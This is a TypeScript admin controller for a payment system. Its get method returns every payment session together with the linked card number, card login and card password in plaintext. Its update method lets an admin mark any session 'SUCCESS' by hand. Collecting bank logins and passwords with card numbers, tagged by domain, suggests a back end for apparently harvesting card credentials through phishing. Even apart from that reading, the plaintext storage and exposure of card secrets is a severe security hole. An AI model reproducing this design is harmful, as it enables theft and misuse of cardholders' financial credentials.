import { Card, Payment, Session, Status } from "@prisma/client";
import { SecretKey } from "../Secure/SeckretKey";
import { Token } from "../Utils/Token";
import { Prisma } from "../Utils/Prisma";
import { Answers } from "../Utils/Answers";
import { Logger } from "../Utils/Logger";
import { AdminTransactionsResponse, RequestGETTransactions, TransactionsData, UpdateTransaction } from "../Models/AdminTransactionsControllerModel";



class AdminTransactinsController {

    public static async get(token: RequestGETTransactions): Promise<Answers | AdminTransactionsResponse> {

        try {

            if (token) {

                const tok: boolean = await Token.verify(token.token, SecretKey.secret_key);

                if (tok) {

                    const session: Session[] | null = await Prisma.client.session.findMany();

                    const sort_sessions: Session[] = session.sort((a: Session, b: Session) => b.id - a.id);

                    if (session) {

                        const ResponseTransactions: TransactionsData[] = []

                        for (const tr of sort_sessions) {

                            const payment: Payment | null = await Prisma.client.payment.findFirst({
                                where: { session_uid: tr.uid }
                            });

                            const respose: TransactionsData = {
                                status: Status[tr.status],
                                sum: tr.amount,
                                domein: tr.domain,
                                uid_session: tr.uid,
                                time: Number(tr.created_at),
                                number_card: '',
                                login: '',
                                password: ''
                            }

                            if (payment && payment.card_id) {

                                const card: Card | null = await Prisma.client.card.findUnique({
                                    where: { id: payment.card_id }
                                });

                                if (card) {
                                    respose.login = card.card_login
                                    respose.password = card.card_password
                                    respose.number_card = card.card_number

                                }

                            }

                            ResponseTransactions.push(respose);

                        }

                        return { status: 200, data: ResponseTransactions }

                    }

                    return Answers.wrong("can not get session");

                }

                return Answers.wrong("token in not correct");

            }

            return Answers.wrong("data in not correct");
        }
        catch (e) {
            Logger.write(process.env.ERROR_LOGS, e);
            return Answers.serverError("error in server");
        }
    }

    public static async update(data: UpdateTransaction): Promise<Answers> {

        try {

            if (data.token) {

                const tok: boolean = await Token.verify(data.token, SecretKey.secret_key);

                if (tok) {

                    const session: Session | null = await Prisma.client.session.findUnique({
                        where: {uid: data.uid}
                    });

                    if (session) {

                        const update_session: Session = await Prisma.client.session.update({
                            where: {uid: data.uid},
                            data: {
                                status: 'SUCCESS'
                            }
                        });
                       
                        return update_session ? Answers.ok('session is update') : Answers.wrong("session is not update")

                    }

                    return Answers.wrong("can not found session");

                }

                return Answers.wrong("token in not correct");

            }

            return Answers.wrong("data in not correct");
        }
        catch (e) {
            Logger.write(process.env.ERROR_LOGS, e);
            return Answers.serverError("error in server");
        }
    }

}

export default AdminTransactinsController;